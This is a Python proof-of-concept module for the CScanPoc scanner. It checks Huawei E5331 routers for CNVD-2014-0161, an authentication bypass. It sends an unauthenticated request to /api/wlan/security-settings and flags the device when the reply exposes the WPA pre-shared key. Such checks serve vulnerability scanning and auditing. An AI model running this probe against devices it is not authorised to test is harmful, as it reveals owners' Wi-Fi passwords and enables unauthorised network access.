# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Huawei_0000'  # 平台漏洞编号
    name = 'Huawei E5331 API验证绕过漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2013-12-06'  # 漏洞公布时间
    desc = '''
        All discovered vulnerabilities can be exploited without authentication and therefore pose a high security risk.。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-0161'
    cnvd_id = 'CNVD-2014-0161'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '华为'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '692fd41b-6689-4b8a-a538-24b88f52da14'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/api/wlan/security-settings'
            response = requests.get(vul_url).content
            if re.search('<WifiWpapsk>', response) and re.search('<WifiWpaencryptionmodes>', response):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
